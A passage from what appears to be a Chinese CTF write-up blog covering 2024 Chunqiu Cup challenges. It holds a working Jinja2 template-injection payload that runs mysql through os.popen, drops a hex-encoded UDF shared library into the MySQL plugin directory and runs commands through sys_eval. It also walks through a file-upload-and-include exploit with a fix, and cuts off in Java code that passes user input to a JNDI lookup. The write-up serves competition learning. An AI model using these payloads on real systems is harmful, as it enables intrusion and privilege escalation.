data-language="sql"><code class="language-sql">&#123;&#123;config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'mysql -uctf -p\'123456\' -e \'SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE "/usr/lib/mysql/plugin/udf.so";\''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'mysql -uctf -p\'123456\' -e \'CREATE FUNCTION sys_eval RETURNS STRING SONAME "udf.so";\''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是提权</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'mysql -uctf -p\'123456\' -e \'select sys_eval("cat /flag");\''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706022505490.png" alt="image-20240706022505490"></p><hr><h2 id="w0rdpress（Unsolved）"><a href="#w0rdpress（Unsolved）" class="headerlink" title="w0rdpress（Unsolved）"></a>w0rdpress（Unsolved）</h2><blockquote><p>WordPress SQLite插件代码审计 + CVE-2016-10956 + CVE-2024-2961</p></blockquote><p>参考：<a href="https://blog.kengwang.com.cn/archives/640/">https://blog.kengwang.com.cn/archives/640/</a></p><p>复现环境：<a href="https://kengwang.lanzouo.com/icftJ23q0p2j">https://kengwang.lanzouo.com/icftJ23q0p2j</a></p><hr><h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><h2 id="simplegoods"><a href="#simplegoods" class="headerlink" title="simplegoods"></a>simplegoods</h2><p>judge.php下有文件上传的功能</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706100905568.png" alt="image-20240706100905568"></p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706100926857.png" alt="image-20240706100926857"></p><p>文件位置在&#x2F;tmp&#x2F;data&#x2F;1.png</p><p>接下来找可以include的点</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706101139254.png" alt="image-20240706101139254"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql_query_goods</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM `goods`"</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query_goods</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//echo var_dump($row);</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;tr>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td>&lt;img class=card src="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">">&lt;/td>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td>"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/td>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td>"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'price'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/td>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'.txt'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么我们需要控制content，发现这里的if条件要求后缀为txt，那么我们得重新上传一个txt</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706103233779.png" alt="image-20240706103233779"></p><p>全局搜索，发现goods_api.php这里可以插入goods的数据</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706101830308.png" alt="image-20240706101830308"></p><p>发现goods_description的值对应sql里面的content</p><p>那么直接传参</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>goods_api<span class="token operator">.</span>php<span class="token operator">?</span>method<span class="token operator">=</span>add<span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">5</span><span class="token operator">&amp;</span>goods_name<span class="token operator">=</span>b<span class="token operator">&amp;</span>goods_price<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>goods_description<span class="token operator">=</span><span class="token operator">/</span>tmp<span class="token operator">/</span>data<span class="token operator">/</span><span class="token number">1.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706103325552.png" alt="image-20240706103325552"></p><p>接下来查询即可，由于judge.php那里有<code>unlink($filename);</code>会删掉我们上传的文件，这里要用到条件竞争</p><p>但是这个靶机访问太多的话还会返回503，nmd</p><h3 id="FIX"><a href="#FIX" class="headerlink" title="FIX"></a>FIX</h3><p>直接修改market.php即可，去掉这里的文件包含</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'.txt'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ezSpring"><a href="#ezSpring" class="headerlink" title="ezSpring"></a>ezSpring</h2><p>代码量不大</p><p>AdminController.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AdminController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">AdminController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/lookup/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"url"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"missing url parameter"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Context</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> result <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"Lookup successful: "</span> <span class="token operator">+</span> result<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                var4<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"Lookup failed"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token 